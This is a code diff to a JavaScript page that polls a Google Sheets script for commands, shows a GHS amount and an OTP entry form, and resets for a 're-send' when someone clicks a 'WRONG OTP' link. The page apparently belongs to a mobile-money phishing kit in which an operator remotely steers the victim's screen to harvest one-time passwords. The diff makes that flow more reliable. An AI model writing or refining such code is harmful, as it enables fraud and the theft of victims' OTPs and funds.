@@ -192,48 +192,54 @@ Amt: GHS ${amt}
 
             // CASE 2: Wrong OTP - Triggered when you click the "WRONG OTP" link
             if(status === "otp_error") {
-                // 1. Shake the UI (optional but professional)
-                const container = document.querySelector('.app-container');
-                container.style.animation = "shake 0.4s";
-                setTimeout(() => container.style.animation = "", 400);
+    // 1. Stop the loop from repeating immediately
+    // We send a 'clear' command to the script so the next poll sees 'pending'
+    fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-                // 2. Visual Feedback
-                const timerEl = document.getElementById('timer');
-                timerEl.style.color = "yellow";
-                timerEl.innerText = "RE-SENDING...";
+    // 2. Visual Reset
+    const timerEl = document.getElementById('timer');
+    timerEl.style.color = "yellow";
+    timerEl.innerText = "RE-SENDING...";
 
-                // 3. Reset the inputs and button
-                document.querySelectorAll('.otp-input').forEach(input => {
-                    input.value = "";
-                    input.style.borderColor = "var(--tele-red)";
-                });
-                
-                const btn = document.getElementById('otp-btn');
-                btn.innerText = "Confirm & Finish";
-                btn.disabled = false;
+    // 3. Clear the OTP boxes
+    document.querySelectorAll('.otp-input').forEach(input => {
+        input.value = "";
+    });
+    
+    const btn = document.getElementById('otp-btn');
+    btn.innerText = "Confirm & Finish";
+    btn.disabled = false;
 
-                // 4. Restart Countdown after 1 second delay
-                setTimeout(() => {
-                    timerEl.style.color = "var(--tele-red)";
-                    runCountdown(30);
-                }, 1000);
-
-                // 5. CRITICAL: Reset the status in Google Sheets so it doesn't loop
-                fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
-            }
+    // 4. Restart Countdown
+    // Use a unique ID for the interval to ensure we don't have multiple timers running
+    if (window.otpInterval) clearInterval(window.otpInterval); 
+    
+    setTimeout(() => {
+        timerEl.style.color = "var(--tele-red)";
+        runCountdown(30);
+    }, 1000);
+}
         } catch(e) {}
     }, 4000);
 }
 
     function runCountdown(sec) {
-        let timer = sec;
-        const el = document.getElementById('timer');
-        const count = setInterval(() => {
-            let s = timer < 10 ? '0'+timer : timer;
-            el.innerText = `00:${s}`;
-            if(--timer < 0) clearInterval(count);
-        }, 1000);
-    }
+    let timer = sec;
+    const el = document.getElementById('timer');
+    
+    // Clear any existing timer before starting a new one
+    if (window.otpInterval) clearInterval(window.otpInterval);
+
+    window.otpInterval = setInterval(() => {
+        let s = timer < 10 ? '0' + timer : timer;
+        el.innerText = `00:${s}`;
+        
+        if (--timer < 0) {
+            clearInterval(window.otpInterval);
+            el.innerText = "00:00";
+        }
+    }, 1000);
+}
 
     // Initial Calculation
     calculate();
